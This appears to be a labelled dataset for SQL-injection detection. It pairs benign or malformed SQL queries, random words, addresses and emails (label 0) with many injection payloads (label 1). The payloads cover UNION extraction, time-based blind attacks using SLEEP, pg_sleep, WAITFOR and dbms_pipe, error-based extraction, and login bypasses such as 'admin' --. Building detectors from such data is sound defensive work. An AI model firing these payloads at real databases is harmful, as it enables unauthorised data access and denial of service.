SELECT Orders.quicklyrID, Employees.about, Employees.deal FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.stoppedID ORDER BY Orders.divideID;0
SELECT column_name ( s )  FROM pack,said;0
"UPDATE inventory SET id = '2023-01-01' WHERE quantity = 'user123';";0
SELECT * FROM element 3;0
-7742  )   as tgzq where 7842  =  7842 or 2062  =  1563;1
-3450' where 4478  =  4478 or 9323  =  9323#;1
SELECT * FROM broke WHERE choice = 'touch' LIMIT 3;0
UNION ALL SELECT 1,2,3,4,5,6#;1
SELECT * FROM safety FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM powerful;0
c7o5ologa;0
/*  	C-style comment;1
SELECT * FROM discover  WHERE every = married;0
SELECT * FROM tribe ORDER BY hunt;0
" select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1";1
SELECT * FROM both WHERE using IN  ( 'wheel', 'society', 'instance' )  ;0
"SELECT user_id FROM users WHERE name = 123;";0
SELECT * FROM sit WHERE    NOT chose = 'newspaper';0
SELECT * FROM clothes WHERE proud = 'third'  AND  ( knowledge = 'thread' OR recognize = 'rocket' ) ;0
ORDER BY 10--;1
SELECT line ( s ) FROM dot INNER JOIN;0
SELECT waitID AS ID, where AS apartment FROM closely;0
"DELETE FROM logs WHERE created_at = '2023-01-01';";0
select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'fnna'  =  'fnna;1
1   )    )    as dgso where 4654  =  4654 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --;1
SELECT * FROM coach WHERE wonder LIKE '%know%';0
88426780z;0
"1%""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""%""  =  """;1
16650765f;0
SELECT medicine FROM fifth;0
SELECT Count ( * )  AS mission;0
"1""  )   where 9447  =  9447";1
1 where 1092  =  1092;1
SELECT search ( s )  FROM he UNION ALL;0
or SLEEP(5)#;1
1' where 8749  =  8749 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --;1
1   )    )    as juoe where 9994  =  9994 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
SELECT Count ( * )  AS seen;0
INSERT INTO usually ( living, everything, story, opinion, tape, scientific )  VALUES  ( 'chain', 'journey'. deer', 'frozen', 'shallow', 'shake', 'age' )  ;0
-8513' union all select 7414--;1
"INSERT INTO employees (created_at, status, email) VALUES ('active', 456, 'john@example.com');";0
1'  )   as ncou where 9166  =  9166 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --;1
1' in boolean mode  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #;1
1'+  (  select 'zirh' where 9054  =  9054 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  +';1
SELECT TOP 50 PERCENT * FROM enter SELECT * FROM soldier FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM property;0
INSERT INTO rays  ( fog, rising, tall )  VALUES  ( 'rule', 'grabbed', 'been' )  ;0
"DELETE FROM inventory WHERE quantity = 'pending';";0
SELECT * FROM  ( SELECT milk FROM opinion ) ;0
or '1'  =  '1'--;1
plza. carmelo solis, 78, 4?g;0
SELECT * FROM are  WHERE ice = managed;0
1'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'holo'  =  'holo;1
castillo de malpica 119,;0
1' where 2911  =  2911;1
1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #;1
"1%""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """;1
1   )    )    as khvx where 7533  =  7533 union all select null,null,null,null,null,null,null,null--;1
"SELECT * FROM plastic WHERE rich BETWEEN ""low"" AND    ""aloud""";0
SELECT AVG ( circus ) FROM instead SELECT SUM ( secret ) ;0
1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'ejnt' like 'ejnt;1
SELECT * FROM troops WHERE equal NOT LIKE '[bright]%';0
SELECT * FROM year WHERE reader = 'declared';0
SELECT expect ( s )  FROM say LEFT JOIN;0
1'   )    )    as ypgz where 8704  =  8704;1
UPDATE shade SET scene =  'failed', City =  'herself' WHERE fastened =  fear;0
SELECT AVG ( except )  FROM speak  SELECT SUM ( sang ) ;0
"SELECT email, created_at, name FROM customers WHERE name = 'pending';";0
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--;1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)));1
-3349' or elt  (  6610  =  4379,4379  )   and 'poqm' like 'poqm;1
1%'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  '%'  =  ';1
"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#";1
SELECT * FROM egg WHERE express IN  ( 'correctly', 'fur', 'car' )  ;0
"1""  )   waitfor delay '0:0:5'--";1
1   )    )    union all select null,null,null,null,null,null,null,null,null--;1
SELECT * FROM adjective WHERE Price NOT BETWEEN 10 AND 20;0
select * from users where id  =  1 or   (  .  )    =  1 union select 1,@@VERSION -- 1;1
""" or """" """;1
SELECT * FROM test FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM easier;0
1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ;1
-6030%'  )   or 3038  =  3038;1
"admin"" or ""1""=""1""/*";1
ORDER BY 24;1
"UPDATE logs SET quantity = 'Sample text' WHERE user_id = 456;";0
ORDER BY 10--;1
"1""  )   as rnjx where 2679  =  2679 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #";1
SELECT ancient ( s ) FROM driving INNER JOIN;0
SELECT shine,further,well,decide,older     (  (  curious JOIN dried ON definition.product =  during.mice )   INNER JOIN motherON Orders.east =  slabs.jarID ) ;0
"1""   )    )    as eqeb where 6784  =  6784 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --";1
"SELECT email, price, user_id FROM products WHERE price = 'active';";0
"; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --";1
1  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ;1
1   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  4127  =  4127;1
"-5014""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""dkyp"" like ""dkyp";1
SELECT * FROM breeze WHERE accept = 'pet'  OR out = 'gave';0
"DELETE FROM logs WHERE id = 'Sample text';";0
-4945 or make_set  (  9354  =  9354,7185  )  ;1
SELECT TOP 50 PERCENT * FROM weigh;0
SELECT Count ( * )  AS mission;0
-3971%'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  '%'  =  ';1
"DELETE FROM products WHERE id = 456;";0
SELECT TOP 50 PERCENT * FROM widely;0
SELECT becameID AS ID, common AS shoe FROM now;0
SELECT variety, mixture, fastened FROM day WHERE chief  IS NULL;0
DELETE FROM roof WHERE heat = 'mine';0
SELECT TOP 3 * FROM slip;0
vilar elsegui;0
1%'  )   union all select null,null,null,null,null,null,null,null,null--;1
1 and 7533  =  7533# absp;1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))--;1
SELECT * FROM so WHERE    NOT nose = 'exercise';0
SELECT move, face, telephoneFROM how WHERE model  IS NOT NULL;0
1'  )   as rqfq where 7077  =  7077 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
"-6626%""  )   or 1744  =  5292 and   (  ""%""  =  """;1
' or pg_sleep(5)--;1
bru_na;0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """;1
SELECT * FROM angry FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM spoken;0
1'  )   where 7541  =  7541;1
"UPDATE sessions SET created_at = 123 WHERE quantity = 123;";0
pasivamente;0
SELECT nature AS milk, yet AS [ranch]  FROM complete;0
1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#;1
"DELETE FROM products WHERE email = 'active';";0
SELECT * FROM fruit  WHERE toy NOT LIKE '[bend]%';0
2129;0
SELECT * FROM buy WHERE vapor  BETWEEN 10 AND 20;0
SELECT television FROM previous UNION ALL SELECT fifteen FROM jar ORDER BY equal;0
"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--";1
"admin""/*";1
SELECT AVG ( motion ) FROM were;0
SELECT COUNT ( everyone ) FROM color;0
SELECT * FROM  ( SELECT running FROM possibly ) ;0
alfeo;0
SELECT * FROM wore WHERE weak = 'gas'  OR additional = 'wherever';0
duby@mtos.mt;0
plza. taboada chivite 32 5?b;0
c/ pablo iglesias, 116;0
"x' and 1  =    (  select count  (  *  )   from tabname  )  ; --";1
"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ";1
"SELECT description, created_at, user_id FROM products WHERE description = 123;";0
-1171' union all select 3958,3958,3958,3958,3958--;1
dagmar;0
SELECT itself, stood, protection FROM how WHERE mountain  IS NULL;0
SELECT went ( s )  FROM using LEFT JOIN;0
"1"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and ""jbty"" like ""jbty";1
-7720   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8254  =  8254;1
select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou;1
koczian@decoaching.is;0
calle tras do colexio s/n;0
"1"" where 3484  =  3484 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --";1
DELETE FROM wrong WHERE picture = 'dinner';0
bizarro;0
SELECT MIN ( liquid )  AS wide FROM day;0
SELECT action, stairs, cool FROM noun WHERE arm  IS NULL;0
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3--;1
-2377%'   )    )     )   union all select 7706,7706--;1
1'   )    )    and 7533  =  7533 and    (    (   'gvoh'  =  'gvoh;1
2,45E+15;0
velero@softwaresaas.ec;0
SELECT * FROM office WHERE four IN  ( SELECT shelter FROM badly ) ;0
romangordo;0
SELECT * FROM birthday ORDER BY court DESC;0
" select * from users where id  =  1 or @#""  (    =  1 or 1  =  1 -- 1";1
select pg_sleep  (  5  )  -- ojzt;1
-4970'  )   union all select 4625,4625,4625,4625,4625,4625,4625,4625#;1
-2573   )    )    order by 1#;1
or true--;1
1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'xhez' like 'xhez;1
SELECT long AS point, birth AS [clean]  FROM child;0
SELECT * FROM floating;0
SELECT * FROM birthday ORDER BY court DESC;0
31560;0
""" or ""a""  =  ""a";1
"-2548""   )    )     )   or 5107  =  8049--";1
1'   )    )     )   order by 1#;1
"DELETE FROM products WHERE price = 123;";0
SELECT * FROM each 3;0
""" or benchmark  (  10000000,MD5  (  1   )    )   #";1
select   (  case when   (  7385  =  8723  )   then 7385 else 7385*  (  select 7385 from information_schema.character_sets  )   end  )  #;1
-2784  )   where 5261  =  5261 or 3472  =  1728#;1
SELECT hunter ( s )  FROM tea UNION;0
1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ;1
1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --;1
SELECT * FROM deeply;0
or '1'  =  '1;1
SELECT * FROM chain WHERE butter LIKE '%way%';0
1'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'xtdj'  =  'xtdj;1
SELECT * FROM future WHERE NOT stream = 'replace'  AND NOT call = 'pay';0
group by userid having 1  =  1--;1
1' where 1031  =  1031 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --;1
"SELECT name FROM products WHERE quantity = 'Sample text';";0
1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz;1
"1%"" union all select null,null,null,null,null,null,null#";1
"SELECT * FROM heard WHERE certainly BETWEEN ""place"" AND    ""ruler""";0
"admin"" or 1=1--";1
AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a);1
SELECT its FROM deal;0
-8341 or 8571  =  8571--;1
1  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #;1
select * from generate_series  (  3180,3180,case when   (  3180  =  4445  )   then 1 else 0 end  )   limit 1--;1
"-3749"" or elt  (  1032  =  1032,3623  )   and ""mzrw""  =  ""mzrw";1
SELECT * FROM such WHERE from = 'wife';0
union   (  select NULL,   (  select @@version   )    )    --;1
1'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   'pcim'  =  'pcim;1
-5320 where 8051  =  8051 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --;1
1'   )    )    as cwss where 9720  =  9720;1
SELECT * FROM there WHERE NOT past = 'purpose'  AND NOT principal = 'secret';0
"SELECT * FROM thrown WHERE wore BETWEEN ""selection"" AND    ""took""";0
1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'lyem' like 'lyem;1
SELECT * FROM job FETCH FIRST 3 ROWS ONLY;0
1'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'rggg'  =  'rggg;1
1'   )    )    as nuku where 7009  =  7009 union all select null,null,null,null,null#;1
SELECT saddleID AS ID, shelter AS shade FROM order;0
-1 UNION SELECT 1 INTO @,@;1
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""wsmz"" like ""wsmz";1
1'   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --;1
-2048   )    )    union all select 7054,7054,7054,7054,7054,7054,7054,7054,7054--;1
" select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1";1
select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   '%'  =  ';1
select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  +';1
" or 0  =  0 #""";1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12--;1
UPDATE stretch SET learn = 'sink'WHERE stared = 'temperature';0
select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1;1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#;1
6,05E+15;0
SELECT * FROM spite FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM describe;0
"DELETE FROM inventory WHERE email = '2023-01-01';";0
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP);1
SELECT * FROM how WHERE flat  BETWEEN 10 AND 20;0
SELECT * FROM scientist WHERE old NOT LIKE 'form%';0
"-7635"" union all select 1284,1284,1284,1284,1284,1284#";1
waitfor delay '0:0:5' and    (    (     (  'ywnm'  =  'ywnm;1
"DELETE FROM inventory WHERE created_at = 123;";0
SELECT * FROM brain WHERE activity NOT LIKE 'bush%';0
-6940'  )   union all select 3042,3042,3042,3042,3042#;1
SELECT influence ( s FROM wherever RIGHT JOIN;0
SELECT * FROM cell FETCH FIRST 50 PERCENT ROWS ONLY;0
arco del meson, 47,;0
cruz nueva, s/n 5-c;0
SELECT COUNT ( DISTINCT closer )  FROM pipe;0
SELECT TOP 3 * FROM mark SELECT * FROM raw 3SELECT * FROM bill;0
SELECT world AS hide, youth AS [flat]  FROM brave;0
-9615  )   as dntk where 4780  =  4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#;1
"SELECT created_at, quantity, email, name FROM customers WHERE description = '2023-01-01';";0
SELECT planet FROM result;0
navalmoral de bjar;0
wailing@mariposasentudia.je;0
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--;1
3226;0
-7815' union all select 2638,2638,2638,2638,2638--;1
SELECT TOP 3 * FROM split SELECT * FROM explore 3SELECT * FROM tie;0
SELECT deeply, to, perFROM improve WHERE aloud  IS NOT NULL;0
"SELECT quantity, user_id FROM products WHERE status = '2023-01-01';";0
SELECT * FROM accept WHERE shells = 'beautiful';0
select * from users where id  =  '1' or <$ or 1  =  1 -- 1';1
1'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'niro'  =  'niro;1
1%' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  ';1
" select * from users where id  =  1 or 1#""@ union select version  (    )  ,version  (    )   -- 1";1
1'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
";waitfor delay '0:0:5'--";1
-4873'   )    )     )   or 3038  =  3038;1
-5021'+  (  select yadq where 4285  =  4285 order by 1#;1
9ig7a2i4;0
"UPDATE employees SET name = 'active' WHERE name = 'Sample text';";0
SELECT AVG ( well ) FROM drop SELECT SUM ( statement ) ;0
" select * from users where id  =  '1' union select "";""_,version  (    )   -- 1'";1
1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'gmbd'  =  'gmbd;1
1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'cimm' like 'cimm;1
1,16E+15;0
SELECT DISTINCT energy FROM smooth;0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""%""  =  """;1
SELECT MIN ( square )  AS freedom FROM memory;0
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--;1
SELECT copper ( s )  FROM day SELECT layers FROM success;0
SELECT COUNT ( climate )  FROM attack;0
admin' --;1
1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs;1
a' or 3  =  3--;1
1'   )    )    as omwk where 1414  =  1414 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --;1
SELECT * FROM earn;0
1' where 8537  =  8537 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --;1
SELECT AVG ( Price ) FROM western;0
SELECT * FROM driver;0
SELECT * FROM tribe WHERE ought = 'possible'  OR carried = 'pattern';0
"admin"" or 1=1--";1
' or sleep(5)#;1
"-2460%""  )   or   (  2660  =  5767  )  *5767 and   (  ""%""  =  """;1
1'||  (  select 'ocmk' from dual where 3961  =  3961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||';1
SELECT TOP 50 PERCENT * FROM cook SELECT * FROM pour FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM per;0
"1""  )   where 6478  =  6478 union all select null,null,null,null,null,null#";1
plouffe4;0
select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  'clhg'  =  'clhg;1
SELECT TOP 3 * FROM community WHERE might = 'electricity' SELECT * FROM same;0
1'||  (  select 'rdqv' from dual where 1894  =  1894;1
1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'vbda' like 'vbda;1
SELECT * FROM flame WHERE men BETWEEN since09/01/1996minute AND teeth15/31/1996rocky;0
SELECT TOP 3 * FROM production WHERE native = 'eat' SELECT * FROM orbit;0
42808198t;0
1  )   as boed where 6787  =  6787;1
88341714w;0
1'  )   and 7533  =  7533 and   (  'dbjq'  =  'dbjq;1
SELECT * FROM church WHERE captured NOT BETWEEN 'invented' AND 'fifty';0
SELECT * FROM flight WHERE aid = 'nervous'  AND City = 'solution';0
1'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'dhqz'  =  'dhqz;1
trissenaar@tetdevelocidad.uk;0
17463;0
nassiet.birkin@cienciapolicial.gl;0
"INSERT INTO logs (created_at, quantity, user_id) VALUES ('2023-01-01', 123, 'user123');";0
-3096' or 3821  =  5539 and 'zrth'  =  'zrth;1
SELECT column_name ( s )  FROM difference,minute;0
SELECT softlyID AS ID, understanding AS discussion FROM type;0
SELECT * FROM who ORDER BY suppose ASC, correctly DESC;0
apolonio;0
-6200%'   )    )    or 8077  =  4661;1
-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#;1
calle calderon de la barca, 141;0
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'ixzr'  =  'ixzr;1
SELECT middle ( s )  FROM promised SELECT tribe ( s ) ;0
SELECT clearly ( s )  FROM somebody UNION;0
select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1;1
"UPDATE customers SET name = 'user123' WHERE description = '2023-01-01';";0
1'||  (  select 'vasx' where 4770  =  4770 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||';1
SELECT * FROM successful FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM capital;0
"1%""  )   union all select null,null,null,null,null,null,null,null,null#";1
SELECT * FROM money FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM forest;0
SELECT * FROM habit 3;0
asc;1
||  (  elt  (  -3+5,bin  (  15  )  ,ord  (  10  )  ,hex  (  char  (  45   )    )      )    )   ;1
